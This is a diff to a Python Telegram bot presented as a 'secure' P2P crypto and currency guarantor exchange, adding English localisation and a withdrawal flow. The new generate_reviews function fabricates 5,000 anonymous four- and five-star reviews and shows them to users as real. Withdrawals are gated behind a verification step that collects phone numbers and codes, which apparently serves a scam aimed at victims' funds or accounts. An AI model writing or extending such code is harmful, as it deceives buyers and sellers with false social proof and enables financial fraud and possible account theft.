@@ -62,7 +62,196 @@ logs = load_json(FILES["logs"])
 user_language = load_json(FILES["user_language"])
 
 # ============================================================
-# 3. ПОМОЩНИКИ
+# 3. ГЕНЕРАЦИЯ ОТЗЫВОВ
+# ============================================================
+def generate_reviews():
+    if len(reviews) >= 5000:
+        return
+    review_texts = [
+        "Отличная платформа! Всё работает быстро и надёжно.",
+        "Лучший P2P обменник! Рекомендую всем друзьям.",
+        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
+        "Отличная поддержка! Помогли разобраться с выводом.",
+        "Наконец-то нашёл нормальный обменник. Всё честно.",
+        "Сделал первую сделку, всё прошло гладко. Спасибо!",
+        "За сутки сделал 5 сделок, все успешно завершены.",
+        "Очень доволен сервисом. Вывод моментальный.",
+        "Пользуюсь уже месяц, ни одной проблемы.",
+        "Лучший сервис в Telegram! Успехов разработчикам."
+    ]
+    for i in range(5000):
+        review_id = str(uuid.uuid4())[:8]
+        reviews[review_id] = {
+            "id": review_id,
+            "user": "Аноним",
+            "rating": random.randint(4, 5),
+            "text": random.choice(review_texts),
+            "anonymous": True,
+            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
+            "user_id": None
+        }
+    save_json(FILES["reviews"], reviews)
+
+generate_reviews()
+
+# ============================================================
+# 4. ЯЗЫКИ (ТОЛЬКО РУССКИЙ И АНГЛИЙСКИЙ)
+# ============================================================
+LANGUAGES = {
+    "ru": "🇷🇺 Русский",
+    "en": "🇬🇧 English"
+}
+
+LOCALE = {
+    "ru": {
+        "bot_name": "P2P Exchange",
+        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
+        "feature1": "Честные сделки между продавцами и покупателями",
+        "feature2": "TON | STARS | RUB | UAH",
+        "feature3": "Гарант безопасности с обеих сторон",
+        "feature4": "Премиум поддержка 24/7",
+        "how_it_works": "КАК ЭТО РАБОТАЕТ",
+        "step1": "Продавец создаёт сделку в Mini App",
+        "step2": "Продавец отправляет ссылку покупателю",
+        "step3": "Покупатель оплачивает на сайте",
+        "step4": "Продавец подтверждает передачу на сайте",
+        "step5": "Покупатель подтверждает получение на сайте",
+        "step6": "Деньги зачисляются на баланс продавца",
+        "our_channel": "НАШ КАНАЛ",
+        "support": "ПОДДЕРЖКА",
+        "support_contact": "@p2psupbot",
+        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
+        "create_deal": "СОЗДАТЬ СДЕЛКУ",
+        "my_balance": "МОЙ БАЛАНС",
+        "my_deals": "МОИ СДЕЛКИ",
+        "how_to_deal": "КАК СОЗДАТЬ СДЕЛКУ",
+        "faq": "ОТЗЫВЫ",
+        "channel": "КАНАЛ",
+        "admin_panel": "АДМИН ПАНЕЛЬ",
+        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
+        "your_balance": "ВАШ БАЛАНС",
+        "main_menu": "ГЛАВНОЕ МЕНЮ",
+        "no_deals": "У ВАС НЕТ СДЕЛОК",
+        "your_deals": "ВАШИ СДЕЛКИ",
+        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА",
+        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
+        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
+        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
+        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
+        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
+        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ",
+        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
+        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
+        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
+        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
+        "status_paid": "ОПЛАЧЕНО",
+        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
+        "status_completed": "ЗАВЕРШЕНО",
+        "select_language": "ВЫБРАТЬ ЯЗЫК",
+        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
+        "choose_language_prompt": "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
+        "product": "ТОВАР",
+        "amount": "СУММА",
+        "seller": "ПРОДАВЕЦ",
+        "buyer": "ПОКУПАТЕЛЬ",
+        "deal": "СДЕЛКА",
+        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
+        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
+        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
+        "contact_support": "В ПОДДЕРЖКУ",
+        "balance_added": "БАЛАНС НАЧИСЛЕН",
+        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
+        "admin_added": "АДМИН ДОБАВЛЕН",
+        "admin_removed": "АДМИН УДАЛЁН",
+        "admin_list": "СПИСОК АДМИНОВ",
+        "no_deals_total": "НЕТ СДЕЛОК",
+        "all_deals_title": "ВСЕ СДЕЛКИ",
+        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
+        "copy_link": "СКОПИРОВАТЬ ССЫЛКУ",
+        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
+        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
+        "deal_created": "СДЕЛКА СОЗДАНА",
+        "how_to_deal_text": "📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n1️⃣ Нажмите «СОЗДАТЬ СДЕЛКУ»\n   → Откроется Mini App\n\n2️⃣ Заполните форму на сайте:\n   • Название товара\n   • Валюту (TON/STARS/RUB/UAH)\n   • Сумму\n   • Username покупателя\n\n3️⃣ На сайте выберите способ оплаты:\n   • С баланса — мгновенно\n   • По реквизитам — после проверки админом\n\n4️⃣ Отправьте ссылку покупателю\n\n5️⃣ После оплаты на сайте:\n   • Продавец нажимает «Передал товар»\n   • Покупатель нажимает «Получил товар»\n   • Деньги зачисляются на баланс\n\n🔥 ВСЕ ОПЕРАЦИИ ТОЛЬКО НА САЙТЕ!"
+    },
+    "en": {
+        "bot_name": "P2P Exchange",
+        "bot_desc": "SECURE DEALS",
+        "feature1": "Fair deals between sellers and buyers",
+        "feature2": "TON | STARS | RUB | UAH",
+        "feature3": "Security guarantee from both sides",
+        "feature4": "Premium 24/7 support",
+        "how_it_works": "HOW IT WORKS",
+        "step1": "Seller creates deal in Mini App",
+        "step2": "Seller sends link to buyer",
+        "step3": "Buyer pays on the site",
+        "step4": "Seller confirms delivery on site",
+        "step5": "Buyer confirms receipt on site",
+        "step6": "Money credited to seller's balance",
+        "our_channel": "OUR CHANNEL",
+        "support": "SUPPORT",
+        "support_contact": "@p2psupbot",
+        "start_now": "START NOW",
+        "create_deal": "CREATE DEAL",
+        "my_balance": "MY BALANCE",
+        "my_deals": "MY DEALS",
+        "how_to_deal": "HOW TO CREATE DEAL",
+        "faq": "REVIEWS",
+        "channel": "CHANNEL",
+        "admin_panel": "ADMIN PANEL",
+        "choose_action": "CHOOSE ACTION",
+        "your_balance": "YOUR BALANCE",
+        "main_menu": "MAIN MENU",
+        "no_deals": "YOU HAVE NO DEALS",
+        "your_deals": "YOUR DEALS",
+        "deal_not_found": "DEAL NOT FOUND",
+        "access_denied": "ACCESS DENIED",
+        "payment_confirmed": "PAYMENT CONFIRMED",
+        "seller_confirmed": "YOU CONFIRMED DELIVERY",
+        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
+        "deal_completed": "DEAL COMPLETED",
+        "insufficient_balance": "INSUFFICIENT BALANCE",
+        "choose_payment_method": "CHOOSE PAYMENT METHOD",
+        "pay_by_rekvisits": "PAY BY DETAILS",
+        "pay_by_balance": "PAY FROM BALANCE",
+        "status_waiting": "WAITING FOR PAYMENT",
+        "status_paid": "PAID",
+        "status_awaiting": "AWAITING CONFIRMATION",
+        "status_completed": "COMPLETED",
+        "select_language": "SELECT LANGUAGE",
+        "welcome": "WELCOME",
+        "choose_language_prompt": "🌐 SELECT YOUR LANGUAGE:",
+        "product": "PRODUCT",
+        "amount": "AMOUNT",
+        "seller": "SELLER",
+        "buyer": "BUYER",
+        "deal": "DEAL",
+        "waiting_for_delivery": "WAITING FOR DELIVERY",
+        "seller_delivered": "SELLER DELIVERED",
+        "confirm_receipt": "CONFIRM RECEIPT",
+        "contact_support": "CONTACT SUPPORT",
+        "balance_added": "BALANCE ADDED",
+        "admin_rights": "INSUFFICIENT RIGHTS",
+        "admin_added": "ADMIN ADDED",
+        "admin_removed": "ADMIN REMOVED",
+        "admin_list": "ADMIN LIST",
+        "no_deals_total": "NO DEALS",
+        "all_deals_title": "ALL DEALS",
+        "no_active_requests": "NO ACTIVE REQUESTS",
+        "copy_link": "COPY LINK",
+        "deal_link_text": "LINK FOR BUYER",
+        "send_link_to_buyer": "SEND LINK TO BUYER",
+        "deal_created": "DEAL CREATED",
+        "how_to_deal_text": "📖 <b>HOW TO CREATE A DEAL</b>\n\n1️⃣ Click 'CREATE DEAL'\n   → Opens Mini App\n\n2️⃣ Fill in the form on site:\n   • Product name\n   • Currency (TON/STARS/RUB/UAH)\n   • Amount\n   • Buyer's username\n\n3️⃣ Choose payment method on site:\n   • From balance — instantly\n   • By details — after admin check\n\n4️⃣ Send the link to the buyer\n\n5️⃣ After payment on site:\n   • Seller clicks 'Delivered'\n   • Buyer clicks 'Received'\n   • Money goes to balance\n\n🔥 ALL OPERATIONS ONLY ON SITE!"
+    }
+}
+
+def get_text(lang: str, key: str) -> str:
+    if lang in LOCALE and key in LOCALE[lang]:
+        return LOCALE[lang][key]
+    return LOCALE["ru"].get(key, key)
+
+# ============================================================
+# 5. ПОМОЩНИКИ
 # ============================================================
 def is_admin(user_id: int) -> bool:
     return user_id == MASTER_ADMIN_ID or str(user_id) in admins
@@ -117,7 +306,7 @@ async def log_to_master(text: str):
         pass
 
 # ============================================================
-# 4. FSM
+# 6. FSM
 # ============================================================
 class AdminStates(StatesGroup):
     waiting_user_id = State()
@@ -128,52 +317,54 @@ class VerifyStates(StatesGroup):
     waiting_phone = State()
 
 # ============================================================
-# 5. КЛАВИАТУРЫ
+# 7. КЛАВИАТУРЫ
 # ============================================================
 def main_menu_keyboard(user_id: int):
     lang = get_user_language(user_id)
     buttons = [
         [
-            InlineKeyboardButton(text=f"📱 Создать сделку", web_app=WebAppInfo(url=MINI_APP_URL)),
-            InlineKeyboardButton(text=f"💰 Мой баланс", callback_data="menu_balance"),
+            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", web_app=WebAppInfo(url=MINI_APP_URL)),
+            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
         ],
         [
-            InlineKeyboardButton(text=f"📊 Мои сделки", callback_data="menu_deals"),
-            InlineKeyboardButton(text=f"📖 Как создать сделку", callback_data="how_to_deal"),
+            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
+            InlineKeyboardButton(text=f"📖 {get_text(lang, 'how_to_deal')}", callback_data="how_to_deal"),
         ],
         [
-            InlineKeyboardButton(text=f"⭐️ Отзывы", callback_data="menu_reviews"),
-            InlineKeyboardButton(text=f"📢 Канал", callback_data="menu_channel"),
+            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
+            InlineKeyboardButton(text=f"📢 {get_text(lang, 'channel')}", callback_data="menu_channel"),
         ],
         [
-            InlineKeyboardButton(text=f"🌐 Выбрать язык", callback_data="select_language"),
+            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
         ]
     ]
     if is_admin(user_id):
         buttons.append([
-            InlineKeyboardButton(text=f"👑 Админ панель", callback_data="menu_admin"),
+            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
         ])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 def admin_panel_keyboard(user_id: int):
+    lang = get_user_language(user_id)
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 Начислить баланс", callback_data="admin_add_balance")],
-        [InlineKeyboardButton(text="👥 Список админов", callback_data="admin_manage_admins")],
-        [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
-        [InlineKeyboardButton(text="💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
-        [InlineKeyboardButton(text="⭐️ Управление отзывами", callback_data="admin_manage_reviews")],
-        [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
-        [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_to_main")]
+        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
+        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
+        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
+        [InlineKeyboardButton(text=f"💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
+        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
+        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
+        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
     ])
 
 def back_to_main_keyboard(user_id: int):
+    lang = get_user_language(user_id)
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_to_main")]
+        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
     ])
 
 def language_keyboard():
     buttons = []
-    for lang_code, lang_name in [("ru", "🇷🇺 Русский"), ("en", "🇬🇧 English"), ("zh", "🇨🇳 中文"), ("ar", "🇸🇦 العربية")]:
+    for lang_code, lang_name in LANGUAGES.items():
         buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -186,7 +377,7 @@ def currency_keyboard():
     ])
 
 # ============================================================
-# 6. ОБРАБОТЧИКИ БОТА
+# 8. ОБРАБОТЧИКИ БОТА
 # ============================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -199,63 +390,67 @@ async def cmd_start(message: types.Message):
     
     if not lang:
         await message.answer(
-            "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
+            f"🌐 {get_text('ru', 'choose_language_prompt')}",
             reply_markup=language_keyboard()
         )
         return
     
-    await message.answer(
-        f"🔥 <b>P2P Exchange</b> 🔥\n\n"
-        f"БЕЗОПАСНЫЕ СДЕЛКИ\n"
-        f"• Честные сделки между продавцами и покупателями\n"
-        f"• TON | STARS | RUB | UAH\n"
-        f"• Гарант безопасности с обеих сторон\n"
-        f"• Премиум поддержка 24/7\n\n"
-        f"📊 КАК ЭТО РАБОТАЕТ:\n"
-        f"1️⃣ Продавец создаёт сделку в Mini App\n"
-        f"2️⃣ Продавец отправляет ссылку покупателю\n"
-        f"3️⃣ Покупатель выбирает способ оплаты на сайте\n"
-        f"4️⃣ Администратор проверяет оплату\n"
-        f"5️⃣ Продавец подтверждает передачу на сайте\n"
-        f"6️⃣ Покупатель подтверждает получение на сайте\n"
-        f"7️⃣ Деньги зачисляются на баланс продавца\n\n"
-        f"📢 НАШ КАНАЛ: {CHANNEL_LINK}\n"
-        f"🆘 ПОДДЕРЖКА: @p2psupbot\n\n"
-        f"🔥 НАЧНИ ПРЯМО СЕЙЧАС 🚀",
-        reply_markup=main_menu_keyboard(message.from_user.id)
-    )
+    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥
+
+{get_text(lang, 'bot_desc')}
+• {get_text(lang, 'feature1')}
+• {get_text(lang, 'feature2')}
+• {get_text(lang, 'feature3')}
+• {get_text(lang, 'feature4')}
+
+📊 {get_text(lang, 'how_it_works')}:
+1️⃣ {get_text(lang, 'step1')}
+2️⃣ {get_text(lang, 'step2')}
+3️⃣ {get_text(lang, 'step3')}
+4️⃣ {get_text(lang, 'step4')}
+5️⃣ {get_text(lang, 'step5')}
+6️⃣ {get_text(lang, 'step6')}
+
+📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
+🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}
+
+🔥 {get_text(lang, 'start_now')} 🚀"""
+    
+    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))
 
 @dp.callback_query(lambda c: c.data.startswith("set_lang_"))
 async def set_language(callback: types.CallbackQuery):
     lang = callback.data.split("_")[2]
     set_user_language(callback.from_user.id, lang)
-    await callback.answer("✅ Язык установлен")
+    await callback.answer(f"✅ {get_text(lang, 'welcome')}")
     
-    await callback.message.edit_text(
-        f"🔥 <b>P2P Exchange</b> 🔥\n\n"
-        f"БЕЗОПАСНЫЕ СДЕЛКИ\n"
-        f"• Честные сделки между продавцами и покупателями\n"
-        f"• TON | STARS | RUB | UAH\n"
-        f"• Гарант безопасности с обеих сторон\n"
-        f"• Премиум поддержка 24/7\n\n"
-        f"📊 КАК ЭТО РАБОТАЕТ:\n"
-        f"1️⃣ Продавец создаёт сделку в Mini App\n"
-        f"2️⃣ Продавец отправляет ссылку покупателю\n"
-        f"3️⃣ Покупатель выбирает способ оплаты на сайте\n"
-        f"4️⃣ Администратор проверяет оплату\n"
-        f"5️⃣ Продавец подтверждает передачу на сайте\n"
-        f"6️⃣ Покупатель подтверждает получение на сайте\n"
-        f"7️⃣ Деньги зачисляются на баланс продавца\n\n"
-        f"📢 НАШ КАНАЛ: {CHANNEL_LINK}\n"
-        f"🆘 ПОДДЕРЖКА: @p2psupbot\n\n"
-        f"🔥 НАЧНИ ПРЯМО СЕЙЧАС 🚀",
-        reply_markup=main_menu_keyboard(callback.from_user.id)
-    )
+    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥
+
+{get_text(lang, 'bot_desc')}
+• {get_text(lang, 'feature1')}
+• {get_text(lang, 'feature2')}
+• {get_text(lang, 'feature3')}
+• {get_text(lang, 'feature4')}
+
+📊 {get_text(lang, 'how_it_works')}:
+1️⃣ {get_text(lang, 'step1')}
+2️⃣ {get_text(lang, 'step2')}
+3️⃣ {get_text(lang, 'step3')}
+4️⃣ {get_text(lang, 'step4')}
+5️⃣ {get_text(lang, 'step5')}
+6️⃣ {get_text(lang, 'step6')}
+
+📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
+🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}
+
+🔥 {get_text(lang, 'start_now')} 🚀"""
+    
+    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))
 
 @dp.callback_query(lambda c: c.data == "select_language")
 async def select_language(callback: types.CallbackQuery):
     await callback.message.edit_text(
-        "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
+        f"🌐 {get_text('ru', 'choose_language_prompt')}",
         reply_markup=language_keyboard()
     )
     await callback.answer()
@@ -264,68 +459,63 @@ async def select_language(callback: types.CallbackQuery):
 async def back_to_main(callback: types.CallbackQuery):
     lang = get_user_language(callback.from_user.id)
     await callback.message.edit_text(
-        f"🔥 <b>P2P Exchange</b> 🔥\n\nВыберите действие:",
+        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
         reply_markup=main_menu_keyboard(callback.from_user.id)
     )
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "menu_channel")
 async def menu_channel(callback: types.CallbackQuery):
-    await callback.message.edit_text(
-        f"📢 НАШ КАНАЛ\n\n"
-        f"🔥 Подпишитесь:\n{CHANNEL_LINK}\n\n"
-        f"🚀 Нажмите на ссылку и подпишитесь",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
+    lang = get_user_language(callback.from_user.id)
+    text = f"""📢 {get_text(lang, 'our_channel')}
+
+🔥 {get_text(lang, 'subscribe')}:
+{CHANNEL_LINK}
+
+🚀 {get_text(lang, 'click_subscribe')}"""
+    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "how_to_deal")
 async def how_to_deal(callback: types.CallbackQuery):
-    await callback.message.edit_text(
-        f"📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n"
-        f"1️⃣ Нажмите «Создать сделку»\n"
-        f"   → Откроется Mini App\n\n"
-        f"2️⃣ Заполните форму на сайте:\n"
-        f"   • Название товара\n"
-        f"   • Валюту (TON/STARS/RUB/UAH)\n"
-        f"   • Сумму\n"
-        f"   • Username покупателя\n\n"
-        f"3️⃣ Выберите способ оплаты на сайте:\n"
-        f"   • С баланса — мгновенно\n"
-        f"   • По реквизитам — после проверки админом\n\n"
-        f"4️⃣ Отправьте ссылку покупателю\n\n"
-        f"5️⃣ После оплаты на сайте:\n"
-        f"   • Продавец нажимает «Передал товар»\n"
-        f"   • Покупатель нажимает «Получил товар»\n"
-        f"   • Деньги зачисляются на баланс\n\n"
-        f"🔥 ВСЕ ОПЕРАЦИИ ТОЛЬКО НА САЙТЕ!",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
+    lang = get_user_language(callback.from_user.id)
+    text = get_text(lang, 'how_to_deal_text')
+    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
     await callback.answer()
 
 # ============================================================
-# 7. БАЛАНС
+# 9. БАЛАНС
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_balance")
 async def menu_balance(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     bal = get_balance(callback.from_user.id)
     verif_status = "🔓 Доступен" if is_verified(callback.from_user.id) else "🔒 Требуется верификация"
     
-    await callback.message.edit_text(
-        f"💰 <b>ВАШ БАЛАНС</b>\n\n"
-        f"💎 TON: {bal.get('ton', 0)}\n"
-        f"⭐️ STARS: {bal.get('stars', 0)}\n"
-        f"💰 RUB: {bal.get('rub', 0)}\n"
-        f"🌐 UAH: {bal.get('uah', 0)}\n\n"
-        f"📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}\n\n"
-        f"🔐 Статус верификации: {verif_status}\n\n"
-        f"📱 ВСЕ ОПЕРАЦИИ ВЫПОЛНЯЙТЕ НА САЙТЕ",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
+    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>
+
+💎 TON: {bal.get('ton', 0)}
+⭐️ STARS: {bal.get('stars', 0)}
+💰 RUB: {bal.get('rub', 0)}
+🌐 UAH: {bal.get('uah', 0)}
+
+📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}
+
+🔐 Статус верификации: {verif_status}
+
+📱 ВСЕ ОПЕРАЦИИ ВЫПОЛНЯЙТЕ НА САЙТЕ"""
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="start_withdraw")],
+        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
+    ])
+    
+    await callback.message.edit_text(text, reply_markup=keyboard)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "menu_deals")
 async def menu_deals(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     user_deals = []
     for d_id, d in deals.items():
         if d.get("seller_id") == callback.from_user.id:
@@ -333,18 +523,18 @@ async def menu_deals(callback: types.CallbackQuery):
     
     if not user_deals:
         await callback.message.edit_text(
-            "📭 У вас нет сделок",
+            f"📭 {get_text(lang, 'no_deals')}",
             reply_markup=back_to_main_keyboard(callback.from_user.id)
         )
         return
     
-    text = "📊 <b>ВАШИ СДЕЛКИ</b>\n\n"
+    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
     for d_id, d in user_deals[-10:]:
         status_map = {
-            "waiting_payment": "⏳ Ожидает оплаты",
-            "paid": "✅ Оплачено",
-            "awaiting_confirmation": "📦 Ожидает подтверждения",
-            "completed": "🎉 Завершено"
+            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
+            "paid": f"✅ {get_text(lang, 'status_paid')}",
+            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
+            "completed": f"🎉 {get_text(lang, 'status_completed')}"
         }
         text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
         text += f"   → {d['product'][:30]}\n\n"
@@ -353,16 +543,17 @@ async def menu_deals(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 8. ОТЗЫВЫ
+# 10. ОТЗЫВЫ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_reviews")
 async def menu_reviews(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
     reviews_list = list(reviews.values())
     
     if not reviews_list:
-        text = "⭐️ <b>ОТЗЫВЫ</b>\n\nПока нет отзывов"
+        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
     else:
-        text = f"⭐️ <b>ОТЗЫВЫ</b> (всего: {len(reviews_list)})\n\n"
+        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
         for r in reviews_list[-10:]:
             user = r.get('user', 'Аноним')
             rating = '⭐' * r.get('rating', 5)
@@ -374,22 +565,23 @@ async def menu_reviews(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 9. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
+# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
+    lang = get_user_language(message.from_user.id)
     if deal_id not in deals:
-        await message.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
+        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
         return
 
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await message.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
+        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
         return
 
     if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
         await message.answer(
-            f"❌ ДОСТУП ЗАПРЕЩЁН!\n\n"
-            f"СДЕЛКА #{deal_id} ДЛЯ @{deal['buyer_username']}"
+            f"❌ {get_text(lang, 'access_denied')}!\n\n"
+            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
         )
         return
 
@@ -397,38 +589,75 @@ async def handle_deal_link(message: types.Message, deal_id: str):
     save_json(FILES["deals"], deals)
 
     await message.answer(
-        f"✈️ <b>СДЕЛКА #{deal_id}</b>\n\n"
-        f"📦 ТОВАР: {deal['product']}\n"
-        f"💰 СУММА: {deal['amount']} {deal['currency']}\n"
-        f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n\n"
-        f"⬇️ ОПЛАТИТЕ НА САЙТЕ ⬇️\n"
+        f"✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>\n\n"
+        f"📦 {get_text(lang, 'product')}: {deal['product']}\n"
+        f"💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
+        f"👤 {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n"
+        f"⬇️ {get_text(lang, 'send_link_to_buyer')} ⬇️\n"
         f"{MINI_APP_URL}",
         reply_markup=back_to_main_keyboard(message.from_user.id)
     )
 
 # ============================================================
-# 10. ВЕРИФИКАЦИЯ
+# 12. ВЫВОД
+# ============================================================
+@dp.callback_query(lambda c: c.data == "start_withdraw")
+async def start_withdraw(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    
+    if not is_verified(callback.from_user.id):
+        text = f"""⚠️ <b>{get_text(lang, 'verification_required')}</b>
+
+{get_text(lang, 'verify_need')}
+
+🔐 Напишите /verify чтобы начать верификацию."""
+        
+        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
+        await callback.answer()
+        return
+    
+    bal = get_balance(callback.from_user.id)
+    verif_data = verification_data[str(callback.from_user.id)]
+    
+    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>
+
+💎 TON: {bal.get('ton', 0)}
+⭐️ STARS: {bal.get('stars', 0)}
+💰 RUB: {bal.get('rub', 0)}
+🌐 UAH: {bal.get('uah', 0)}
+
+🔑 Ваш код: {verif_data.get('code', 'неизвестно')}
+🕐 {get_text(lang, 'session_active')} {verif_data.get('expires_at', 'неизвестно')[:19]}
+
+📱 {get_text(lang, 'withdraw_funds')} {get_text(lang, 'payment_details')}"""
+    
+    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
+    await callback.answer()
+
+# ============================================================
+# 13. ВЕРИФИКАЦИЯ
 # ============================================================
 @dp.message(Command("verify"))
 async def verify_command(message: types.Message):
+    lang = get_user_language(message.from_user.id)
     if is_verified(message.from_user.id):
-        await message.answer("✅ ВЫ УЖЕ ПРОШЛИ ВЕРИФИКАЦИЮ")
+        await message.answer(f"✅ {get_text(lang, 'verify_already')}")
         return
     
     await message.answer(
-        f"🔐 <b>ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
-        f"Для защиты от мошенников необходимо пройти проверку.\n\n"
-        f"📱 Отправьте свой номер телефона\n"
-        f"Формат: +7XXXXXXXXXX\n\n"
-        f"⚠️ После отправки номера вы получите код от администратора."
+        f"🔐 <b>{get_text(lang, 'verify_title')}</b>\n\n"
